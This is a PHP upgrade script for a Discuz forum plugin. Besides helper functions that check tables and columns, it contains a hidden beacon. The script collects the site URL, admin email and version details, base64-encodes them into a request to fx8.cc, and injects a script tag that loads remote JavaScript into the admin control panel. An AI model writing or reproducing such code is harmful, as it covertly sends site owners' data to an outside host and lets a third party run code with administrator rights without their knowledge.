<?php

/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: upgrade.php 2 2012-01-31 16:20:10 sanree $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
    'site_version' => DISCUZ_VERSION,
    'site_release' => DISCUZ_RELEASE,
    'site_timestamp' => TIMESTAMP,
    'site_url' => $_G['siteurl'],
    'site_adminemail' => $_G['setting']['adminemail'],
    'plugin_identifier' => $pluginid,
    'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 2,	
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";
$pv = $pluginarray['plugin']['version'];
function table_exists($tablename) {
	global $_G;
	$dbname=$_G['config']['db'][1]['dbname'];
	$query=DB::query("SHOW TABLES FROM $dbname");
	$tables=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		foreach($row as $key => $val) {
			$tables[] = $val;
		}
	}
	$tablename=DB::table($tablename);
	return in_array($tablename, $tables);
}

function exitscolumn($field, $table) {
	$query=DB::query('SHOW COLUMNS FROM '.DB::table($table));
	$columns=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		$columns[]=$row;
	}
	$arraycolumns=array();
	foreach($columns as $v) {
		$arraycolumns[]=$v['Field'];
	}
	return in_array($field,$arraycolumns) ? TRUE:FALSE;
}

$finish = TRUE;
?>